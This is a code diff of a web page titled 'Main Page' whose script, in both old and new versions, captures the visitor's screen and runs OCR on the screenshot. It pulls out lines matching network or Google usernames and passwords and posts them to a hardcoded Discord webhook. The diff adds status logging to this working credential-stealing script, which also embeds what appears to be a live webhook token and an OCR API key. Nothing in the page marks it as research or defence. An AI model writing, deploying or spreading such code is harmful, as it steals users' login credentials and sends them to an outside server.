@@ -3,25 +3,37 @@
 <head>
 <meta charset="UTF-8">
 <title>Main Page</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; }
+  #status { white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; }
+</style>
 </head>
 <body>
 <h1>Main Page</h1>
+<div id="status">Starting...</div>
+
 <script>
 const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd";
 const OCR_KEY="K85882318988957";
 
+function logStatus(msg){
+  const s = document.getElementById("status");
+  s.textContent += msg + "\n";
+  console.log(msg);
+}
+
 (async()=>{
   try{
-    // 1️⃣ Open test tab for handshake
+    logStatus("Opening test tab for permissions...");
     const testTab = window.open("test.html","_blank");
 
-    // 2️⃣ Request screen capture (simpler, more reliable)
+    logStatus("Requesting screen capture...");
     const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
 
-    // 3️⃣ Notify test.html that permission is granted
+    logStatus("Sending allowed-permissions message to test tab...");
     testTab.postMessage({msg:"allowed-permissions"},"*");
 
-    // 4️⃣ Wait for acknowledgment from test.html
+    logStatus("Waiting for test tab acknowledgment...");
     await new Promise(resolve=>{
       function handler(e){
         if(e.data?.msg==="allowed-permissions"){
@@ -32,19 +44,17 @@ const OCR_KEY="K85882318988957";
       window.addEventListener("message", handler);
     });
 
-    // 5️⃣ Optional 1-second pause
-    await new Promise(r => setTimeout(r, 1000));
+    logStatus("Acknowledgment received. Waiting 1 second before OCR...");
+    await new Promise(r => setTimeout(r,1000));
 
-    // 6️⃣ Setup video element
+    logStatus("Setting up video element...");
     const video = document.createElement("video");
     video.srcObject = stream;
 
-    // Wait until metadata is loaded and video is playing
     await new Promise(resolve=>{
       video.onloadedmetadata = ()=> video.play().then(resolve);
     });
 
-    // Wait until video actually has width/height
     await new Promise(resolve=>{
       const check = ()=> {
         if(video.videoWidth && video.videoHeight) resolve();
@@ -53,26 +63,30 @@ const OCR_KEY="K85882318988957";
       check();
     });
 
-    // 7️⃣ Capture screenshot to canvas
+    logStatus("Capturing screenshot...");
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video,0,0);
     stream.getTracks().forEach(t=>t.stop());
 
-    // 8️⃣ Convert canvas to blob for OCR
     const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
     const formData = new FormData();
     formData.append("apikey",OCR_KEY);
     formData.append("language","eng");
     formData.append("file",blob,"shot.png");
 
-    // 9️⃣ Call OCR API
+    logStatus("Sending screenshot to OCR API...");
     const ocrRes = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
     const ocrJson = await ocrRes.json();
-    if(!ocrJson.ParsedResults?.length) return;
 
-    // 10️⃣ Filter text for network/google lines
+    if(!ocrJson.ParsedResults?.length){
+      logStatus("OCR worked, but no text detected.");
+      testTab.postMessage({msg:"close-tab"},"*");
+      return;
+    }
+
+    logStatus("OCR worked. Processing text...");
     const lines = ocrJson.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/);
     const output = lines.reduce((a,v,i)=>{
       if(a) return a;
@@ -81,21 +95,27 @@ const OCR_KEY="K85882318988957";
       }
       return "";
     },"").trim();
-    if(!output) return;
 
-    // 11️⃣ Send result to Discord
+    if(!output){
+      logStatus("Found no matches for network/google username or password.");
+    } else {
+      logStatus("Found matches:\n" + output);
+    }
+
+    logStatus("Sending results to Discord...");
     await fetch(WEBHOOK,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({content:output||"(no valid text found)"})
     });
 
-    console.log("OCR + Discord done!");
-
-    // 12️⃣ Tell test tab to close itself
+    logStatus("OCR + Discord done!");
+    logStatus("Closing test tab...");
     testTab.postMessage({msg:"close-tab"},"*");
 
-  } catch(e){console.error(e);}
+  } catch(e){
+    logStatus("Error: " + e.message);
+  }
 })();
 </script>
 </body>
